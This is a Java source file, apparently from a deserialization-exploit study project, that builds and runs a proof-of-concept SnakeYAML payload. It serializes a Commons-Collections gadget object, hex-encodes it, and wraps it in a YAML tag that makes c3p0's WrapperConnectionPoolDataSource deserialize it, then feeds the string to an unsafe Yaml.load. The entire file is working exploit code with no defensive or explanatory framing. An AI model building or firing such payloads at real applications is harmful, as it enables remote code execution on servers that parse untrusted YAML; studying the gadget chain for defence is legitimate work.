package com.yyjccc.yaml;

import com.mchange.lang.ByteUtils;
import com.yyjccc.CommonsExp.Cc3;
import com.yyjccc.CommonsExp.Cc4;
import org.yaml.snakeyaml.Yaml;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class C3p0_hex {

	public static byte[] getBytesFromObj(Object o){

			ByteArrayOutputStream bao = new ByteArrayOutputStream();
			ObjectOutputStream oos = null;
			try {
				oos = new ObjectOutputStream(bao);
			} catch (IOException e) {
				throw new RuntimeException(e);
			}
			try {
				oos.writeObject(o);
			} catch (IOException e) {
				throw new RuntimeException(e);
			}
			byte[] byteArray = bao.toByteArray();
			return byteArray;
	}
	public static void main(String[] args) {
		String hex;
		try {
			 hex= ByteUtils.toHexAscii(getBytesFromObj(Cc3.cc3_1()));
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
		String poc = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource {userOverridesAsString : \"HexAsciiSerializedMap:"+hex+";\"}";
		System.out.println(poc);
		Yaml yaml = new Yaml();
		yaml.load(poc);



	}
}
